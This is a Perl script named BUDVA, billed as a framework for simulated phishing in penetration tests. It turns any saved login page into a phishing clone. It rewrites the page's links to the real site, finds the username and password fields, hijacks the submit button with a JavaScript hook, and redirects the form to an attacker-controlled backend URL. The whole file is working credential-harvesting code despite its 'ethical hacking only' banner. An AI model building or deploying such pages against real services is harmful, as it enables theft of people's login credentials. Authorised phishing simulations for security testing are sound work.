#!/usr/bin/perl -w
use strict;
###################################################
#**************************************************
#
#         Welcome to BUDVA :)
#
#**************************************************
###################################################
#
# USE THIS FRAMEWORK FOR ETHICAL HACKING ONLY
#
###################################################
#
# This engine transforms ANY login-page into
# phishing-page, pointing it to the attacker's
# server.
#
# Software created for legal simulations
# of phising-attacks during penetration tests
#
# THE POWER of PERL-CODING :))
#
#
###################################################
############## SETTINGS ###########################
###################################################

my $sourcehtml = "./etalonpage.html"; # example: login page of Mail-server or Router or even NGFW

my $resulthtml = "./resultprod.html"; # put the result page to your web-server

my $JSjobTemplate = "./jsjob.js";

my $URLpointingToAttackersWebServer = "http://127.0.0.1/submit.php"; # points to your backend

my $httpMethodToUse = "GET"; # recommended option

my $FileWithMessageToShowAfterCatchingTheFish = "./messagefile.txt"; # at the moment does not used

my $FQDNofTheRealPage="https://127.0.0.1/";  # valid FQDN-part of the real page

###################################################
############# MANUFACTORY #########################
###################################################

open(PAGE, "< $sourcehtml") or die "\nTrying to use '$sourcehtml' as an ETALON-page, but the file was not found: $!\n\nMay be you have forgotten to EDIT settings in the SCRIPT...\n";
my $page = join("",<PAGE>);
close(PAGE);

open(JS, "< $JSjobTemplate") or die "JS-template not found: $!\n";
my $jstemplate = join("",<JS>);
close(JS);


print "\nWelcome to BUDVA phishing boad manufactory!\n\nStarting PAGE transformation:\n\n";

# Let's put correct FQDNs to all internal relative-URLs for correct Browsing of the page
print "0) Let's put correct FQDNs to all internal relative-URLs for correct Browsing of the page:\n";

$page =~ s/src="([0-9a-cefgik-zA-CEFGIK-Z])/my $r=$1;"src=\"$FQDNofTheRealPage$r";/gem;
$page =~ s/src="([0-9a-cefgik-zA-CEFGIK-Z])/my $r=$1;"src=\"$FQDNofTheRealPage$r";/gem;
#$page =~ s/src="\.\.\//src="$FQDNofTheRealPage\.\.\//gm;
#$page =~ s/src='\.\.\//src='$FQDNofTheRealPage\.\.\//gm;
$page =~ s/src="\//src="$FQDNofTheRealPage/gm;
$page =~ s/src='\//src='$FQDNofTheRealPage/gm;
$page =~ s/href="([0-9a-cefgik-zA-CEFGIK-Z\#])/my $r=$1;"href=\"$FQDNofTheRealPage$r";/gem;
$page =~ s/href="([0-9a-cefgik-zA-CEFGIK-Z\#])/my $r=$1;"href=\"$FQDNofTheRealPage$r";/gem;
$page =~ s/href="\//href="$FQDNofTheRealPage/gm;
$page =~ s/href='\//href='$FQDNofTheRealPage/gm;


print "Done\n";

# Let's try to find IDs of INPUTs for login and password
print "1) Let's try to find IDs of INPUTs for login and password:\n";

my ($loginid,$passwordid);

$page =~ m/(\<[inputINPUT]{5}[\w\W]{,80}?[typeTYPE]{4}[\s]*[\=]{1}['"]*[textTEXT]{4}[\w\W]+?\>)/;
$loginid=$1;
if($loginid eq "") {
        $page =~ m/(\<[inputINPUT]{5}[\w\W]{,50}?[textTEXT]{4}[\w\W]+?\>)/;
        $loginid=$1;
        print "Trying to analyze alternative inputs...\n";
}
if($loginid ne "") {
        print "**********************\nFound LOGINID block:\n$loginid\nLet's use it!\n";
        $loginid =~ m/\s[idID]{2}[\s]*[\=]{1}['"]*([\w\W]+?)['"]*\s/;
        my $res=$1;
        if($res =~ m/^[a-zA-Z\-\_]{,16}$/) {
                print "A: ID of the LOGIN input element: [$res]\n";
                $loginid = $res;
        } else {
                $loginid =~ m/\s[nameNAME]{4}[\s]*[\=]{1}['"]*([\w\W]+?)['"]*\s/;
                $res = $1;
                if($res =~ m/^[a-zA-Z\-\_]{,16}$/) {
                        print "B: ID of the LOGIN input element: [$res]\n";
                        $loginid = $res;
                        $page =~ s/(\<[inputINPUT]{5}[\w\W]{,80}?[typeTYPE]{4}[\s]*[\=]{1}['"]*[textTEXT]{4}[\w\W]+?\>)/my $p=$1;$p=~s#[\/]*\># id="$loginid"\>#gm;$p;/gme;
                } else {
                        print "B: USING EMPTY LOGIN !!!!!\n";
                        $loginid = "emptylogin";
                }
        }
} else {
        print "A: USING EMPTY LOGIN !!!!!\n";
        $loginid = "emptylogin";
}




$page =~ m/(\<[inputINPUT]{5}[\w\W]{,80}?[typeTYPE]{4}[\s]*[\=]{1}['"]*[passwordPASSWORD]{8}[\w\W]+?\>)/;
$passwordid = $1;
if($passwordid ne "") {
        print "**********************\nFound PASSWORDID block:\n$passwordid\nLet's use it!\n";
        $passwordid =~ m/\s[idID]{2}[\s]*[\=]{1}['"]*([\w\W]+?)['"]*\s/;
        my $res = $1;
        if($res ne $passwordid) {
                print "A: ID of the PASSWORD input element: [$res]\n";
                $passwordid = $res;
        } else {
                $passwordid =~ m/\s[nameNAME]{4}[\s]*[\=]{1}['"]*([\w\W]+?)['"]*\s/;
                $res = $1;
                if($res ne $passwordid) {
                        print "B: ID of the PASSWORD input element: [$res]\n";
                        $passwordid = $res;
                        $page =~ s/(\<[inputINPUT]{5}[\w\W]{,80}?[typeTYPE]{4}[\s]*[\=]{1}['"]*[passwordPASSWORD]{8}[\w\W]+?\>)/my $p=$1;$p=~s#[\/]*\># id="$passwordid"\>#gm;$p;/gme;
                } else {
                        print "Could not find PASSWORDID\nExiting...\n";
                        exit(0);
                }
        }
} else {
        print "Could not find PASSWORDID\nExiting...\n";
        exit(0);
}


$jstemplate =~ s/<!--;LOGINID-->/$loginid/gm;
$jstemplate =~ s/<!--;PASSWORDID-->/$passwordid/gm;
$jstemplate =~ s/<!--;httpMethodToUse-->/$httpMethodToUse/gm;
$jstemplate =~ s/<!--;URLpointingToAttackersWebServer-->/$URLpointingToAttackersWebServer/gm;


# Now let's try to find SUBMIT BUTTON
print "\n2) Now let's try to find SUBMIT BUTTON and find some 'onclick' event and modify it...\n";

my $pagetempl = $page;
$pagetempl =~ s/(\<(?=(form|FORM))[\w\W]+?(\<[inputINPUTBUTTONbutton]{5,6}[\w\W]{,80}?[typeTYPE]{4}[\s]*[\=]{1}['"]*[buttonBUTTONsubmitSUBMIT]{6}[\w\W]+?\>))/<!--;TRANSFORMBLOCK-->/g;
my $transformblock = $1;
my $buttonblock = $3;
if($buttonblock ne "") {
        print "A: **********************\nFound BUTTON block:\n$buttonblock\n\nLet's use it!\n\n";
        $buttonblock =~ s/[onclickONCLICK]{7}[\s]*[\=]{1}[\s]*[']{1}[\w\W]+?[']{1}//g;
        $buttonblock =~ s/[onclickONCLICK]{7}[\s]*[\=]{1}[\s]*["]{1}[\w\W]+?["]{1}//g;
        #       $transformblock =~ s/[typeTYPE]{4}[\s]*[\=]{1}['"]*[submitSUBMIT]{6}['"]{1}//g;
        $buttonblock =~ s/[typeTYPE]{4}[\s]*[\=]{1}['"]*[submitSUBMIT]{6}['"]{1}//g;
        $buttonblock =~ s/[typeTYPE]{4}[\s]*[\=]{1}['"]*[buttonBUTTON]{6}['"]{1}//g;
        $buttonblock =~ s/[\/]*\>/ onclick="BudvaPhishingBoat();" type="button">/g;
        $transformblock =~ s/\<[inputINPUTBUTTONbutton]{5,6}[\w\W]{,80}?[typeTYPE]{4}[\s]*[\=]{1}['"]*[buttonBUTTON]{6}[\w\W]+?\>/$buttonblock/g;
        $transformblock =~ s/\<[inputINPUTBUTTONbutton]{5,6}[\w\W]{,80}?[typeTYPE]{4}[\s]*[\=]{1}['"]*[submitSUBMIT]{6}[\w\W]+?\>/$buttonblock/g;
        $pagetempl =~ s/<!--;TRANSFORMBLOCK-->/$transformblock/gm;
        $page = $pagetempl;
}
print "RESULT #1:\n [$buttonblock]\n\n";

my $i=123;
$i=~m/(1)(2)(3)/g;
$page =~ s/(\<[formFORM]{4}[\w\W]+?(\<(a|A|div|DIV|img|IMG|span|SPAN)\s[\w\W]{,70}[onclick]{7}[\s]*[\=]{1}["]{1}[\w\W]+?["]{1}[\w\W]*?\>))/<!--;TRANSFORMBLOCK-->/g;
$transformblock = $1;
$buttonblock = $2;
my $flag = '0';
if($transformblock eq "1") {
        $i=~m/(1)(2)(3)/g;
        $page =~ s/(\<[formFORM]{4}[\w\W]+?(\<(a|A|div|DIV|img|IMG|span|SPAN)\s[\w\W]{,70}[onclick]{7}[\s]*[\=]{1}[']{1}[\w\W]+?[']{1}[\w\W]*?\>))/<!--;TRANSFORMBLOCK-->/g;
        $transformblock = $1;
        $buttonblock = $2;
        $flag = '1';
}
if($transformblock ne "1") {
        #       print "ANALYSE:\n[$transformblock] [$buttonblock]\n";
        if($buttonblock ne "") {
                print "B: **********************\nFound BUTTON block:\n$buttonblock\n\nLet's use it!\n\n";
                $buttonblock =~ s/[typeTYPE]{4}[\s]*[\=]{1}['"]*[submitSUBMIT]{6}['"]{1}//g;
                if($flag eq '1') {
                        $buttonblock =~ s/[onclick]{7}[\s]*[\=]{1}[']{1}[\w\W]+?[']{1}//g;
                        $buttonblock =~ s/[\/]*\>/ onclick="BudvaPhishingBoat();">/g;
                        $transformblock =~ s/\<(a|A|div|DIV|img|IMG|span|SPAN)\s[\w\W]{,70}?[onclick]{7}[\s]*[\=]{1}[']{1}[\w\W]+?[']{1}[\w\W]*?\>/$buttonblock/g;
                } else {
                        $buttonblock =~ s/[onclick]{7}[\s]*[\=]{1}["]{1}[\w\W]+?["]{1}//g;
                        $buttonblock =~ s/[\/]*\>/ onclick="BudvaPhishingBoat();">/g;
                        $transformblock =~ s/\<(a|A|div|DIV|img|IMG|span|SPAN)\s[\w\W]{,70}?[onclick]{7}[\s]*[\=]{1}["]{1}[\w\W]+?["]{1}[\w\W]*?\>/$buttonblock/g;
                }
                $transformblock =~ s/[typeTYPE]{4}[\s]*[\=]{1}['"]*[submitSUBMIT]{6}['"]{1}//g;
                $page =~ s/<!--;TRANSFORMBLOCK-->/$transformblock/gm;
        }
        print "\nRESULT #2: [$buttonblock]\n\n";
}

print "Done\n";

# Now let's clean the FORM tag:
print "\n3) Let's transform the FORM tag and add JS to page:\n";
$page =~ s/(<[formFORM]{4}\s[\w\W]+?\>)/my $formtag = $1; print "WAS: $formtag\n";$formtag=~s#[autocompleteAUTOCOMPLETE]{12}[\s]*[\=]{1}['"]{1}[\w\W]+?['"]{1}##;$formtag=~s#[onsubmitONSUBMIT]{8}[\s]*[\=]{1}['"]{1}[\w\W]+?['"]{1}##;$formtag=~s#[actionACTION]{6}[\s]*[\=]{1}['"]{1}[\w\W]+?['"]{1}##;$formtag=~s#[methodMETHOD]{6}[\s]*[\=]{1}['"]{1}[\w\W]+?['"]{1}##;$formtag=~s#[formFORM]{4}\s#form method="$httpMethodToUse" onsubmit="return false;" autocomplete="on" #;print "NEW: $formtag";"$jstemplate\n$formtag";/gme;

#print "We got page:\n\n===========================================\n\n$page\n\n===================================================\n\n";

open(PROD,"> $resulthtml");
print PROD "$page";
close(PROD);
print "\n\n*********************************\n\nPage was saved to '$resulthtml' file\n";

print "\n\nJOB IS FINISHED SUCCESSFULLY\n\n";

###################################################
###################################################
exit(0);
